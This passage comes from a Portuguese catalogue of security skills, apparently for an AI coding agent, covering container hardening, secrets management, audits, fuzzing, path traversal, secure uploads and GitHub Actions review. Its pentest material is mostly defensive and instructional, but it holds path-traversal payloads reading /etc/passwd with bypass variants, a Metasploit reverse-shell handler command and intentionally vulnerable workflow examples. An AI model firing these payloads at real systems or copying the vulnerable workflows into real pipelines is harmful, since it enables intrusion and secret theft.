- `memory-forensics`: Para análise de side channels

**Padrões e anti-padrões:**
✅ Fazer: Usar bibliotecas criptográficas auditadas, testar contra timing attacks
❌ Evitar: Implementar criptografia customizada, ignorar side channels, usar comparações normais

**Dicas de performance:**
- Use bibliotecas que já implementam constant-time operations
- Teste em diferentes arquiteturas de hardware
- Use ferramentas de análise estática para detectar padrões inseguros

**Comandos úteis:**
```bash
# Análise de timing com valgrind
valgrind --tool=massif ./crypto_program

# Teste de timing
python3 -m timeit "constant_time_compare(a, b)"

# Análise estática
clang -analyze -analyzer-checker=security.insecureAPI crypto.c
```

**Referências:**
- [Timing Attacks](https://crypto.stanford.edu/~dabo/pubs/papers/Timing.pdf)
- [Constant-Time Programming](https://www.nayuki.io/page/constant-time-algorithm-tutorials)
- [Treviso Crypto](https://trevisocrypto.github.io/)

---

### 16. container-security-hardening
**Descrição:** Hardening de imagens Docker/containers e deployments com imagens base seguras, usuários non-root, varredura CVE, SBOM, seccomp/AppArmor e controles de segurança Kubernetes.

**Quando usar:**
- Revisão de segurança de Dockerfiles
- Hardening de imagens container em produção
- Conformidade com benchmarks de segurança

**Exemplos práticos:**
```dockerfile
# Exemplo 1: Dockerfile seguro
FROM gcr.io/distroless/static-debian12

# Não usar root
USER nonroot:nonroot

# Adicionar labels de segurança
LABEL org.opencontainers.image.source="https://github.com/example/app"
LABEL org.opencontainers.image.description="App seguro"

# Copiar apenas arquivos necessários
COPY --from=builder /app/dist /app

# Comando de execução
CMD ["/app/server"]
```

```yaml
# Exemplo 2: Kubernetes Security Context
apiVersion: v1
kind: Pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
```

**Casos de uso avançados:**
- **Zero Trust Containers:** Implementar segurança em camadas
- **Runtime Protection:** Monitoramento em tempo real
- **Conformidade CI/CD:** Integração em pipelines

**Integração com outras skills:**
- `scanning-tools`: Para varredura de vulnerabilidades
- `supply-chain-security`: Para segurança de imagens
- `security-scanning-security-dependencies`: Para análise de dependências

**Padrões e anti-padrões:**
✅ Fazer: Usar imagens base mínimas, escanear regularmente, implementar políticas de rede
❌ Evitar: Usar latest sem verificação, rodar como root, ignorar CVEs

**Dicas de performance:**
- Use multi-stage builds para reduzir tamanho
- Implemente cache de layers
- Use registries privados com scan automático

**Comandos úteis:**
```bash
# Scan de imagem
trivy image myapp:latest

# Verificar configuração
kube-score score deployment.yaml

# Analisar SBOM
syft myapp:latest -o spdx-json > sbom.json
```

**Referências:**
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Kubernetes Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [NIST Container Security Guide](https://csrc.nist.gov/publications/detail/sp/800-190/final)

---

### 17. cred-omega
**Descrição:** CISO operacional enterprise para gestão total de credenciais e segredos.

**Quando usar:**
- Gestão centralizada de credenciais
- Implementação de vault de segredos
- Conformidade com políticas de segurança

**Exemplos práticos:**
```yaml
# Exemplo 1: Configuração HashiCorp Vault
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultAuth
metadata:
  name: kubernetes-auth
spec:
  kubernetes:
    role: my-app
    serviceAccount: my-app

---
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultStaticSecret
metadata:
  name: db-credentials
spec:
  mount: secret
  path: database/creds/my-app
  destination:
    create: true
    name: db-creds
  refreshAfter: 30s
```

```bash
# Exemplo 2: Gerenciar segredos
vault kv put secret/my-app/api-key value=abc123

# Exemplo 3: Rotacionar credenciais
vault read database/creds/my-app

# Exemplo 4: Audit log
vault audit enable file file_path=/var/log/vault-audit.log
```

**Casos de uso avançados:**
- **Dynamic Secrets:** Credenciais de curta duração
- **Encryption as a Service:** Criptografia centralizada
- **Identity-based Access:** Acesso baseado em identidade

**Integração com outras skills:**
- `secrets-management`: Para gestão abrangente
- `aws-secrets-rotation`: Para rotação automática
- `mtls-configuration`: Para autenticação mútua

**Padrões e anti-padrões:**
✅ Fazer: Usar dynamic secrets, implementar audit logs, rotacionar regularmente
❌ Evitar: Armazenar segredos em texto plano, compartilhar credenciais, ignorar logs

**Dicas de performance:**
- Use cache para segredos frequentes
- Implemente retry logic para falhas
- Use namespaces para isolamento

**Comandos úteis:**
```bash
# Iniciar Vault
vault server -dev

# Habilitar engine
vault secrets enable -path=secret kv-v2

# Configurar política
vault policy write my-app - <<EOF
path "secret/data/my-app/*" {
  capabilities = ["read"]
}
EOF
```

**Referências:**
- [HashiCorp Vault Documentation](https://www.vaultproject.io/docs)
- [Vault Kubernetes Guide](https://www.vaultproject.io/docs/platform/k8s)
- [Dynamic Secrets](https://www.vaultproject.io/docs/secrets)

---

### 18. cyber-audit
**Descrição:** Executar verificações de exposição somente leitura para avisos de segurança e escrever relatório de auditoria local estruturado.

**Quando usar:**
- Auditorias rápidas de exposição
- Verificação de segredos em repositórios
- Relatórios de conformidade

**Exemplos práticos:**
```bash
# Exemplo 1: Verificar segredos no código
trufflehog filesystem --directory=/path/to/repo

# Exemplo 2: Verificar configurações inseguras
gitleaks detect --source /path/to/repo

# Exemplo 3: Auditoria de dependências
npm audit --json > audit-report.json

# Exemplo 4: Verificar arquivos sensíveis
find . -name "*.env" -o -name "*.key" -o -name "*.pem"
```

**Casos de uso avançados:**
- **CI/CD Integration:** Verificar antes de commit
- **Monitoramento contínuo:** Varreduras agendadas
- **Resposta a incidentes:** Identificar exposição rápida

**Integração com outras skills:**
- `audit-skills`: Para auditoria de skills
- `cyber-audit`: Para verificações de exposição
- `production-audit`: Para auditoria pré-lançamento

**Padrões e anti-padrões:**
✅ Fazer: Automatizar verificações, manter registros, remediar imediatamente
❌ Evitar: Ignorar alertas, armazenar segredos em repositórios, compartilhar credenciais

**Dicas de performance:**
- Use pre-commit hooks para verificações locais
- Integre com ferramentas de CI/CD
- Configure alertas para violações críticas

**Comandos úteis:**
```bash
# Instalar gitleaks
brew install gitleaks

# Scan completo
gitleaks detect --source . --verbose

# Verificar secrets em commits
git log -p | trufflehog git file://. --only-verified
```

**Referências:**
- [Gitleaks Documentation](https://github.com/gitleaks/gitleaks)
- [TruffleHog Documentation](https://trufflesecurity.com/trufflehog)
- [OWASP Secrets Management](https://owasp.org/www-project-secrets-management/)

---

### 19. dependency-management-deps-audit
**Descrição:** Especialista em segurança de dependências, especializado em varredura de vulnerabilidades, conformidade de licenças e segurança de cadeia de suprimentos.

**Quando usar:**
- Análise de dependências do projeto
- Verificação de licenças
- Auditoria de cadeia de suprimentos

**Exemplos práticos:**
```bash
# Exemplo 1: Auditoria npm
npm audit
npm audit --json

# Exemplo 2: Verificar licenças
license-checker --summary

# Exemplo 3: SBOM generation
syft . -o spdx-json > sbom.json

# Exemplo 4: Verificar vulnerabilidades
grype . --fail-on high
```

**Casos de uso avançados:**
- **Compliance Automatizado:** Verificar licenças em pipeline
- **Atualização Segura:** Sugerir atualizações para dependências seguras
- **Análise de impacto:** Avaliar impacto de vulnerabilidades

**Integração com outras skills:**
- `supply-chain-security`: Para análise abrangente
- `security-scanning-security-dependencies`: Para varreduras específicas
- `scanning-tools`: Para ferramentas complementares

**Padrões e anti-padrões:**
✅ Fazer: Automatizar auditorias, manter dependências atualizadas, verificar licenças
❌ Evitar: Ignorar vulnerabilities, usar dependências abandonadas, não verificar transitive deps

**Dicas de performance:**
- Use lock files para consistência
- Integre com Dependabot/Renovate
- Configure pipelines para bloquear vulnerabilities críticas

**Comandos úteis:**
```bash
# Node.js
npm audit fix
npm audit --omit=dev

# Python
pip-audit
safety check

# Java
mvn dependency:tree
mvn versions:display-dependency-updates
```

**Referências:**
- [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/)
- [Snyk Documentation](https://docs.snyk.io/)
- [NIST SSDF](https://csrc.nist.gov/projects/ssdf)

---

### 20. differential-review
**Descrição:** Revisão de código focada em segurança para PRs, commits e diffs.

**Quando usar:**
- Code review de alterações de segurança
- Revisão de pull requests
- Análise de commits específicos

**Exemplos práticos:**
```bash
# Exemplo 1: Revisar diff de segurança
git diff HEAD~1 HEAD -- '*.js' '*.py' | semgrep --config=auto

# Exemplo 2: Verificar vulnerabilidades em PR
# Configurar GitHub Actions para review automático

# Exemplo 3: Analisar mudanças críticas
git log --oneline --diff-filter=M -- 'src/auth/*'

# Exemplo 4: Verificar padrões inseguros
semgrep --config=p/r2c-security-audit .
```

**Casos de uso avançados:**
- **PR Reviews Automatizados:** Integrar SAST em pipelines
- **Análise de Impacto:** Avaliar risco de mudanças
- **Compliance de Código:** Verificar conformidade

**Integração com outras skills:**
- `sast-configuration`: Para configuração de SAST
- `semgrep-rule-creator`: Para regras personalizadas
- `security-auditor`: Para auditorias abrangentes

**Padrões e anti-padrões:**
✅ Fazer: Revisar todas as mudanças de segurança, usar automação, documentar decisões
❌ Evitar: Aprovar sem review, ignorar mudanças críticas, não testar correções

**Dicas de performance:**
- Use ferramentas de review automático
- Foque em arquivos críticos (auth, crypto, db)
- Mantenha checklists de revisão

**Comandos úteis:**
```bash
# Semgrep em diff
semgrep --config=auto --diff

# Revisar mudanças específicas
git show <commit-hash> -- '*.py'

# Verificar padrões
rg "eval\(" --type py
```

**Referências:**
- [GitHub Code Review Best Practices](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/reviewing-changes-in-pull-requests)
- [Semgrep Diff Scanning](https://semgrep.dev/docs/ignoring-files-folders-code/#diff-aware-scanning)
- [OWASP Code Review Guide](https://owasp.org/www-project-code-review-guide/)

---

### 21. email-security
**Descrição:** Revisão autorizada de segurança de e-mail: análise de phishing, autenticação SPF/DKIM/DMARC, investigação de padrões BEC e pesquisa de abuso de tokens de caixa de correio.

**Quando usar:**
- Investigar tentativas de phishing
- Verificar configuração de e-mail
- Auditoria de segurança de comunicações

**Exemplos práticos:**
```bash
# Exemplo 1: Verificar SPF
dig TXT example.com | grep spf

# Exemplo 2: Verificar DKIM
dig TXT selector._domainkey.example.com

# Exemplo 3: Verificar DMARC
dig TXT _dmarc.example.com

# Exemplo 4: Analisar header de e-mail
# Usar ferramentas como MX Toolbox
```

**Casos de uso avançados:**
- **Proteção contra BEC:** Configurar autenticação avançada
- **Análise de campanhas de phishing:** Rastrear ataques
- **Conformidade regulatória:** Verificar conformidade com políticas

**Integração com outras skills:**
- `email-security`: Para análise abrangente
- `red-team-tactics`: Para simulações de phishing
- `security-auditor`: Para auditorias de segurança

**Padrões e anti-padrões:**
✅ Fazer: Configurar SPF/DKIM/DMARC, monitorar relatórios, treinar usuários
❌ Evitar: Ignorar relatórios DMARC, usar configurações padrão, não verificar regularmente

**Dicas de performance:**
- Use ferramentas automatizadas para verificação
- Configure alertas para falhas de autenticação
- Implemente treinamento regular

**Comandos úteis:**
```bash
# Verificar MX
dig MX example.com

# Verificar registros TXT
dig TXT example.com

# Testar configuração
python3 -c "import dns.resolver; print(dns.resolver.resolve('example.com', 'TXT'))"
```

**Referências:**
- [DMARC.org](https://dmarc.org/)
- [SPF Record Best Practices](https://www.spfwizard.net/)
- [DKIM.org](https://dkim.org/)

---

### 22. ethical-hacking-methodology
**Descrição:** Domine o ciclo de vida completo de testes de penetração, desde reconhecimento até relatório.

**Quando usar:**
- Planejamento de assessments de segurança
- Execução de pentests metodológicos
- Treinamento de equipes de segurança

**Exemplos práticos:**
```markdown
# Exemplo 1: Framework de 5 fases
1. Reconhecimento
   - OSINT: theHarvester, Maltego
   - DNS enumeration: dig, nslookup
2. Varredura
   - Port scanning: Nmap
   - Vulnerability scanning: Nessus, OpenVAS
3. Ganho de Acesso
   - Exploitation: Metasploit
   - Password attacks: Hydra, John
4. Manutenção de Acesso
   - Persistence: backdoors
   - Lateral movement
5. Relatório
   - Documentação de findings
   - Recomendações de remediação
```

**Casos de uso avançados:**
- **Red Team Operations:** Simulações avançadas de APT
- **Purple Team:** Colaboração entre ofensiva e defensiva
- **Bug Bounty Programs:** Estruturar programas de recompensa

**Integração com outras skills:**
- `pentest-checklist`: Para planejamento detalhado
- `pentest-commands`: Para referência de comandos
- `red-team-tactics`: Para táticas avançadas

**Padrões e anti-padrões:**
✅ Fazer: Seguir metodologia, documentar tudo, obter autorização
❌ Evitar: Testar sem autorização, pular fases, ignorar escopo

**Dicas de performance:**
- Use checklists para garantir cobertura
- Automatize tarefas repetitivas
- Mantenha templates de relatório

**Comandos úteis:**
```bash
# Reconhecimento
theHarvester -d example.com -b google,linkedin

# Varredura
nmap -sV -sC -O target.com

# Explotação
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; run"
```

**Referências:**
- [PTES](http://www.pentest-standard.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST SP 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final)

---

### 23. ffuf-claude-skill
**Descrição:** Web fuzzing com ffuf.

**Quando usar:**
- Fuzzing de endpoints web
- Descoberta de diretórios e parâmetros
- Testes de input validation

**Exemplos práticos:**
```bash
# Exemplo 1: Fuzzing de diretórios
ffuf -u https://example.com/FUZZ -w wordlist.txt

# Exemplo 2: Fuzzing de parâmetros
ffuf -u "https://example.com/api?FUZZ=test" -w params.txt

# Exemplo 3: Fuzzing com filtros
ffuf -u https://example.com/FUZZ -w wordlist.txt -fc 404

# Exemplo 4: Fuzzing POST
ffuf -u https://example.com/login -X POST -d "user=admin&FUZZ=password" -w wordlist.txt
```

**Casos de uso avançados:**
- **API Discovery:** Encontrar endpoints não documentados
- **Parameter Discovery:** Identificar parâmetros ocultos
- **Virtual Host Discovery:** Encontrar hosts virtuais

**Integração com outras skills:**
- `ffuf-web-fuzzing`: Para fuzzing avançado
- `scanning-tools`: Para varreduras complementares
- `burp-suite-testing`: Para análise detalhada

**Padrões e anti-padrões:**
✅ Fazer: Usar wordlists direcionadas, filtrar falsos positivos, ajustar rate limiting
❌ Evitar: Fuzzing sem escopo, ignorar impacto, não testar em staging

**Dicas de performance:**
- Use threads adequadas
- Filtre por tamanho de resposta
- Use recursão para diretórios

**Comandos úteis:**
```bash
# Instalar ffuf
go install github.com/ffuf/ffuf/v2@latest

# Fuzzing básico
ffuf -u https://FUZZ.example.com -w subdomains.txt

# Fuzzing com autenticação
ffuf -u https://example.com/api/FUZZ -H "Authorization: Bearer token" -w endpoints.txt
```

**Referências:**
- [FFUF Documentation](https://github.com/ffuf/ffuf)
- [FFUF Usage Examples](https://github.com/ffuf/ffuf/blob/master/README.md)
- [Web Fuzzing Guide](https://owasp.org/www-community/Fuzzing)

---

### 24. ffuf-web-fuzzing
**Descrição:** Orientação especializada para fuzzing web com ffuf durante testes de penetração, incluindo fuzzing autenticado.

**Quando usar:**
- Testes de penetração com autenticação
- Fuzzing de APIs protegidas
- Descoberta de funcionalidades ocultas

**Exemplos práticos:**
```bash
# Exemplo 1: Fuzzing autenticado
ffuf -u https://example.com/api/FUZZ \
  -H "Authorization: Bearer <token>" \
  -w endpoints.txt \
  -mc 200,201,204

# Exemplo 2: Fuzzing com cookies
ffuf -u https://example.com/admin/FUZZ \
  -b "session=abc123" \
  -w wordlist.txt

# Exemplo 3: Fuzzing de subdomínios
ffuf -u https://FUZZ.example.com \
  -w subdomains.txt \
  -H "Host: FUZZ.example.com"

# Exemplo 4: Fuzzing de parâmetros POST
ffuf -u https://example.com/api \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"FUZZ":"test"}' \
  -w params.json
```

**Casos de uso avançados:**
- **API Security Testing:** Testar endpoints de API
- **GraphQL Fuzzing:** Testar queries e mutations
- **WebSocket Fuzzing:** Testar comunicações WebSocket

**Integração com outras skills:**
- `ffuf-claude-skill`: Para fuzzing básico
- `idor-testing`: Para testes de autorização
- `api-security-testing`: Para APIs

**Padrões e anti-padrões:**
✅ Fazer: Usar rate limiting, testar em staging, documentar descobertas
❌ Evitar: Fuzzing agressivo, ignorar impacto, não validar resultados

**Dicas de performance:**
- Use calibração automática
- Filtre por tempo de resposta
- Use automação para reconhecimento

**Comandos úteis:**
```bash
# Calibração
ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200 -ac

# Fuzzing recursivo
ffuf -u https://example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# Exportar resultados
ffuf -u https://example.com/FUZZ -w wordlist.txt -o results.json -of json
```

**Referências:**
- [FFUF Advanced Usage](https://github.com/ffuf/ffuf/wiki)
- [Authenticated Fuzzing](https://github.com/ffuf/ffuf#authenticated-fuzzing)
- [API Fuzzing Techniques](https://owasp.org/www-project-api-security/)

---

### 25. file-path-traversal
**Descrição:** Identificar e explorar vulnerabilidades de traversão de caminho de arquivo (directory traversal).

**Quando usar:**
- Testes de penetração em uploads de arquivo
- Verificação de acessos a arquivos
- Auditoria de controles de acesso

**Exemplos práticos:**
```bash
# Exemplo 1: Teste básico de traversal
curl "https://example.com/download?file=../../etc/passwd"

# Exemplo 2: Bypass de filtros
curl "https://example.com/download?file=....//....//etc/passwd"

# Exemplo 3: Null byte injection
curl "https://example.com/download?file=../../etc/passwd%00.jpg"

# Exemplo 4: Encoding bypass
curl "https://example.com/download?file=..%252f..%252fetc%252fpasswd"
```

**Casos de uso avançados:**
- **Path Traversal em APIs:** Testar endpoints de API
- **File Upload Bypass:** Explorar uploads maliciosos
- **Container Escape:** Acessar arquivos do host

**Integração com outras skills:**
- `file-uploads`: Para segurança de uploads
- `sql-injection-testing`: Para testes complementares
- `linux-privilege-escalation`: Para escalação

**Padrões e anti-padrões:**
✅ Fazer: Validar todos os inputs, usar allow lists, testar extensivamente
❌ Evitar: Confiar em filtros, permitir paths arbitrários, ignorar encoding

**Dicas de performance:**
- Use ferramentas automatizadas
- Teste diferentes variações
- Analise logs para padrões

**Comandos úteis:**
```bash
# Ferramenta de teste
dotdotpwn -m http -u "https://example.com/download?file="

# Teste manual
python3 -c "print('../' * 10 + 'etc/passwd')"

# Análise de logs
cat access.log | grep "\.\./"
```

**Referências:**
- [OWASP Path Traversal](https://owasp.org/www-community/Path_Traversal)
- [Testing for Path Traversal](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Input_Validation_Testing/11-Testing_for_Path_Traversal)
- [DotDotPwn](https://github.com/wireghoul/dotdotpwn)

---

### 26. file-uploads
**Descrição:** Especialista em uploads de arquivos e armazenamento em nuvem. Cobertura de S3, Cloudflare R2, URLs pré-assinadas e uploads multipart.

**Quando usar:**
- Implementação segura de uploads
- Validação de tipos de arquivo
- Armazenamento seguro em nuvem

**Exemplos práticos:**
```javascript
// Exemplo 1: Upload seguro com validação
const multer = require('multer');
const path = require('path');

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/');
  },
  filename: (req, file, cb) => {
    const uniqueName = `${Date.now()}-${Math.round(Math.random() * 1E9)}`;
    cb(null, `${uniqueName}${path.extname(file.originalname)}`);
  }
});

const fileFilter = (req, file, cb) => {
  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
  if (allowedTypes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Tipo de arquivo não permitido'), false);
  }
};

const upload = multer({ storage, fileFilter, limits: { fileSize: 5 * 1024 * 1024 } });

// Exemplo 2: Upload para S3 com URL pré-assinada
const AWS = require('aws-sdk');
const s3 = new AWS.S3();

const getPresignedUrl = async (key) => {
  return s3.getSignedUrl('putObject', {
    Bucket: 'my-bucket',
    Key: key,
    Expires: 300 // 5 minutos
  });
};

// Exemplo 3: Validação de conteúdo
const fileType = require('file-type');
const validateFile = async (buffer) => {
  const type = await fileType(buffer);
  if (!type) throw new Error('Tipo de arquivo inválido');
  if (!['image/jpeg', 'image/png'].includes(type.mime)) {
    throw new Error('Tipo de arquivo não permitido');
  }
};
```

**Casos de uso avançados:**
- **Upload de grandes arquivos:** Multipart upload
- **Scan de malware:** Verificação automática
- **CDN Integration:** Entrega otimizada

**Integração com outras skills:**
- `file-path-traversal`: Para prevenir traversal
- `container-security-hardening`: Para uploads em containers
- `secrets-management`: Para credenciais de armazenamento

**Padrões e anti-padrões:**
✅ Fazer: Validar tipo e tamanho, renomear arquivos, usar armazenamento temporário
❌ Evitar: Permitir uploads arbitrários, confiar em extensões, armazenar no webroot

**Dicas de performance:**
- Use URLs pré-assinadas para uploads diretos
- Implemente streaming para arquivos grandes
- Use CDNs para entrega

**Comandos úteis:**
```bash
# Upload para S3
aws s3 cp file.txt s3://bucket/uploads/ --acl private

# Verificar tipo de arquivo
file --mime-type uploaded_file.jpg

# Scan de malware
clamscan uploaded_file.pdf
```

**Referências:**
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [AWS S3 Presigned URLs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrl.html)
- [Multer Documentation](https://github.com/expressjs/multer)

---

### 27. firmware-analyst
**Descrição:** Analista de firmware especialista em sistemas embarcados, segurança IoT e engenharia reversa de hardware.

**Quando usar:**
- Análise de firmware de dispositivos IoT
- Engenharia reversa de hardware
- Auditoria de segurança de firmware

**Exemplos práticos:**
```bash
# Exemplo 1: Extrair firmware
binwalk -e firmware.bin

# Exemplo 2: Analisar sistema de arquivos
sasquatch firmware.img

# Exemplo 3: Verificar rootkits
rkhunter --check

# Exemplo 4: Analisar kernel
strings firmware.bin | grep -i "linux\|kernel"
```

**Casos de uso avançados:**
- **IoT Security Research:** Descobrir vulnerabilidades em dispositivos
- **Firmware Reverse Engineering:** Entender implementações
- **Secure Boot Analysis:** Verificar cadeia de confiança

**Integração com outras skills:**
- `binary-analysis-patterns`: Para análise de binários
- `reverse-engineer`: Para engenharia reversa
- `protocol-reverse-engineering`: Para protocolos

**Padrões e anti-padrões:**
✅ Fazer: Usar ambiente isolado, documentar achados, comparar versões
❌ Evitar: Analisar em produção, ignorar anti-tampering, pular etapas

**Dicas de performance:**
- Use ferramentas automatizadas
- Mantenha base de dados de firmware
- Use sandbox para análise

**Comandos úteis:**
```bash
# Extrair e analisar
binwalk -eM firmware.bin

# Analisar strings
strings -n 8 firmware.bin | sort -u > strings.txt

# Verificar hashes
sha256sum firmware.bin
```

**Referências:**
- [Binwalk Documentation](https://github.com/ReFirmLabs/binwalk)
- [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit)
- [OWASP IoT Project](https://owasp.org/www-project-internet-of-things/)

---

### 28. frontend-security-coder
**Descrição:** Especialista em práticas seguras de codificação frontend, especializado em prevenção XSS, sanitização de output e padrões de segurança client-side.

**Quando usar:**
- Desenvolvimento de aplicações web seguras
- Implementação de Content Security Policy
- Prevenção de XSS e clickjacking

**Exemplos práticos:**
```javascript
// Exemplo 1: Sanitização de input
const sanitizeHtml = require('sanitize-html');

const clean = sanitizeHtml(userInput, {
  allowedTags: ['b', 'i', 'em', 'strong'],
  allowedAttributes: {}
});

// Exemplo 2: Content Security Policy
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
  );
  next();
});

// Exemplo 3: Anti-clickjacking
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});

// Exemplo 4: Validação de input com Joi
const Joi = require('joi');
const schema = Joi.object({
  email: Joi.string().email().required(),
  name: Joi.string().alphanum().min(3).max(30).required()
});
```

**Casos de uso avançados:**
- **SPA Security:** Segurança em aplicações de página única
- **Progressive Web Apps:** Segurança em PWAs
- **Client-side Encryption:** Criptografia no navegador

**Integração com outras skills:**
- `xss-html-injection`: Para testes de XSS
- `security-and-hardening`: Para hardening geral
- `gdpr-data-handling`: Para proteção de dados

**Padrões e anti-padrões:**
✅ Fazer: Sanitizar todo input, usar CSP, implementar validação client e server
❌ Evitar: Confiar em validação client-side, usar eval(), ignorar encoding

**Dicas de performance:**
- Use bibliotecas de sanitização otimizadas
- Implemente CSP para mitigar impacto
- Use Subresource Integrity

**Comandos úteis:**
```bash
# Verificar CSP
curl -I https://example.com | grep -i content-security

# Analisar headers de segurança
python3 -c "import requests; r=requests.get('https://example.com'); print(dict(r.headers))"

# Testar XSS
python3 xss_scanner.py -t https://example.com
```

**Referências:**
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy](https://csp.withgoogle.com/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

---

### 29. fsi-compliance-checker
**Descrição:** Mapeia alterações de código, arquitetura e infraestrutura para IDs de controle específicos em PCI-DSS v4.0 e MAS TRM.

**Quando usar:**
- Conformidade com regulamentações financeiras
- Auditorias PCI-DSS
- Verificação de controles de segurança

**Exemplos práticos:**
```yaml
# Exemplo 1: Configuração de compliance
compliance:
  standard: "PCI-DSS v4.0"
  controls:
    - id: "REQ-1"
      name: "Firewall Configuration"
      status: "implemented"
      evidence: "aws-security-group-rules.json"
    - id: "REQ-2"
      name: "Default Passwords"
      status: "verified"
      evidence: "password-audit-report.pdf"

# Exemplo 2: Verificação automática
# Script para verificar controles
#!/bin/bash
echo "Verificando controles PCI-DSS..."
aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]]'

# Exemplo 3: Relatório de conformidade
aws configservice get-compliance-by-config-rule --config-rule-name "restricted-ssh"
```

**Casos de uso avançados:**
- **Compliance as Code:** Definir controles em código
- **Auditoria Automatizada:** Verificações contínuas
- **Relatórios Executivos:** Dashboards para gestão

**Integração com outras skills:**
- `pci-compliance`: Para PCI específico
- `security-compliance-compliance-check`: Para multi-standard
- `aws-compliance-checker`: Para AWS

**Padrões e anti-padrões:**
✅ Fazer: Automatizar verificações, manter evidências, atualizar controles
❌ Evitar: Confiar em verificações manuais, ignorar mudanças, não validar evidências

**Dicas de performance:**
- Use ferramentas de automação
- Mantenha documentação atualizada
- Implemente alertas para violações

**Comandos úteis:**
```bash
# Verificar PCI-DSS
aws configservice get-compliance-by-config-rule --config-rule-name pci-dss

# Gerar relatório
aws configservice get-compliance-summary-by-account

# Verificar HIPAA
aws configservice get-compliance-details-by-config-rule --config-rule-name hipaa
```

**Referências:**
- [PCI Security Standards Council](https://www.pcisecuritystandards.org/)
- [MAS TRM](https://www.mas.gov.sg/regulation/technology/cyber-health)
- [AWS Compliance Programs](https://aws.amazon.com/compliance/programs/)

---

### 30. gdpr-data-handling
**Descrição:** Guia prático de implementação para processamento de dados compatível com GDPR, gerenciamento de consentimento e controles de privacidade.

**Quando usar:**
- Implementação de requisitos GDPR
- Gerenciamento de consentimento
- Direitos do titular de dados

**Exemplos práticos:**
```python
# Exemplo 1: Registro de consentimento
from datetime import datetime

class ConsentRecord:
    def __init__(self, user_id, purpose):
        self.user_id = user_id
        self.purpose = purpose
        self.granted_at = datetime.now()
        self.granted = True
    
    def revoke(self):
        self.granted = False
        self.revoked_at = datetime.now()

# Exemplo 2: Direito ao esquecimento
def delete_user_data(user_id):
    # Deletar dados de todos os sistemas
    db.users.delete_one({'_id': user_id})
    db.logs.delete_many({'user_id': user_id})
    cache.delete(f'user:{user_id}')
    
    # Registrar exclusão
    audit_log.record('data_deletion', user_id)

# Exemplo 3: Exportação de dados
def export_user_data(user_id):
    data = {
        'user': db.users.find_one({'_id': user_id}),
        'activity': list(db.activity.find({'user_id': user_id})),
        'preferences': db.preferences.find_one({'user_id': user_id})
    }
    return json.dumps(data, default=str)
```

**Casos de uso avançados:**
- **Privacy by Design:** Implementar desde o início
- **Data Protection Impact Assessment:** Avaliação de impacto
- **Cross-border Data Transfers:** Transferências internacionais

**Integração com outras skills:**
- `privacy-by-design`: Para design seguro
- `security-compliance-compliance-check`: Para conformidade
- `gdpr-data-handling`: Para implementação

**Padrões e anti-padrões:**
✅ Fazer: Registrar consentimentos, implementar direitos, documentar processos
❌ Evitar: Coletar dados desnecessários, ignorar pedidos, não atualizar consentimentos

**Dicas de performance:**
- Use ferramentas de gerenciamento de consentimento
- Automatize respostas a pedidos
- Implemente criptografia para dados sensíveis

**Comandos úteis:**
```bash
# Verificar dados de usuário
mongoexport --db=mydb --collection=users --query='{"user_id":"123"}'

# Deletar dados
mongo mydb --eval="db.users.deleteOne({_id: '123'})"

# Auditar acessos
grep "user_id=123" access.log
```

**Referências:**
- [GDPR.eu](https://gdpr.eu/)
- [ICO GDPR Guide](https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/)
- [OneTrust](https://www.onetrust.com/gdpr/)

---

### 31. gha-security-review
**Descrição:** Encontrar vulnerabilidades exploráveis em workflows GitHub Actions. Cada achado DEVE incluir cenário concreto de exploração.

**Quando usar:**
- Auditoria de pipelines CI/CD
- Revisão de workflows GitHub Actions
- Identificação de vulnerabilities

**Exemplos práticos:**
```yaml
# Exemplo 1: Vulnerabilidade com injeção de comandos
name: Build
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Build
        run: echo "Building ${{ github.event.head_commit.message }}"

# Exemplo 2: Secrets em logs
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: |
          echo "Deploying with token: ${{ secrets.GITHUB_TOKEN }}"
          # Vulnerabilidade: secret exposto em log

# Exemplo 3: Checkout inseguro
name: Build
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      # Vulnerabilidade: PR de fork pode modificar workflow
```

**Casos de uso avançados:**
